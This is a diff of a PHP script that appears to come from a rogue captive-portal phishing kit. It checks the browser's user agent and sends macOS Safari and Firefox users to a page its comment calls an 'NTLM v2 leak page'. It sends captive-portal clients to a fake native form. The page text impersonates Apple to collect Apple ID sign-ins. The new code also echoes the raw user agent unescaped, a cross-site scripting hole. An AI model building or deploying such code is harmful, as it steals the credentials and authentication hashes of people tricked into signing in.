@@ -1,13 +1,26 @@
 <?php
     $user_agent = $_SERVER['HTTP_USER_AGENT'];
-    if (strpos($user_agent, 'Macintosh') !== false) {
-        if (strpos($user_agent, 'AppleWebKit') == false) {
-            header("Location: /leak.php");
-        }
-        else {
-            header("Location: /macos_native/");
-        }
+    echo $user_agent;
+
+    if (preg_match("/i(Pad|Pod|Phone)/", $user_agent)) {
+        //echo "<br/>This is Apple Mobile device";
     }
+    else {
+        if (preg_match("/Mac OS/", $user_agent)) {
+            if (preg_match("/(Safari|Firefox)/", $user_agent)) {
+                //echo "<br/>This is Apple Browser";
+                // redirect to NTLM v2 leak page
+                header("Location: /leak.php");
+            }
+            else {
+                //echo "<br/>This is Apple Captive form";
+                // redirect to MacOS native form
+                header("Location: /macos_native/");
+            }
+        }
+
+    }
+    exit(0);
 
     $title = "Sign In - Apple";
     $intro = "Your session is closed sign in with your Apple ID";
